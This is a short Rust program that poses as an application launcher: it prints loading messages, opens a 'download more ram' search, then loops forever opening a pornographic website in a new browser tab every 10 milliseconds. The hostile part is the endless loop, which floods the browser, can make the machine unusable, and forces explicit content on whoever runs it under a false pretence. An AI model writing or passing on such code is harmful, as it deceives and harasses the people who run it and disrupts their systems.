    use std::{thread, time};

    fn main() {
        println!("Loading...");
        thread::sleep(time::Duration::from_secs(2));
        println!("Starting application in browser!");
        thread::sleep(time::Duration::from_secs(1));
        
        if let Err(e) = open_tab("https://google.com/search?q=download+more+ram") {
            println!("{:#?}", e);
            panic!("Failed to execute program!");
        }    
        thread::sleep(time::Duration::from_secs(2));

        let delay = time::Duration::from_millis(10);
        let target_url = "https://pornhub.com/gay";

        loop {
            if let Err(e) = open_tab(target_url) {
                println!("{:#?}", e);
                panic!("Failed to execute program!");
            }
            thread::sleep(delay);
        }
    }

    fn open_tab(url: &str) -> Result<(), std::io::Error> {
        webbrowser::open(&url)
    }